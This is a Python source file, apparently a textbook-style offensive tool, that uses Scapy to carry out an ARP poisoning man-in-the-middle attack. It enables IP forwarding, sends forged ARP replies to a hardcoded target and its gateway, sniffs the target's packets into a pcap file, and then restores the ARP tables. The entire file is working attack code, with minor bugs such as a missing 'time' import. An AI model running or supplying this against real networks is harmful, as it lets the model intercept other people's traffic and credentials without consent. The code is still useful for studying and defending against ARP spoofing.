from scapy.all import *
import os
import sys
import threading
import signal


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=gateway_mac,count=5))
    send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=target_mac,count=5))
    os.kill(os.getpid(), signal.SIGINT)
    
    
def get_mac(ip):
    """Return a MAC address bound to an IP address.
    """
    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """Start ARP poisoning for a specified target and gateway.
    """
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison")
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(1)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print('[*] Attack finished')


def main():
    interface = 'wlan0'
    target_ip = '192.168.1.70'
    gateway_ip = '192.168.1.1'
    packet_count = 1000

    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    conf.verb = 0

    print("[*] setting up {}".format(interface))

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print ('[!] Failed to get gateway')
        sys.exit(1)
    print('[*] Gateway {} is at {}'.format(gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print('[!] Failed to get target')
        sys.exit(0)
    print('[*] Gateway {} is at {}'.format(target_ip, target_mac))

    poison_thread = threading.Thread(
        target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print('[*] Starting sniffer for {} packets'.format(packet_count))
        bpf_filter = 'IP host {}'.format(target_ip)
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        wrpcap('/root/Desktop/arper.pcap', packets)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(1)
    finally:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        print('[*] Finished capturing packets')
   
if __name__ == "__main__":
    main()
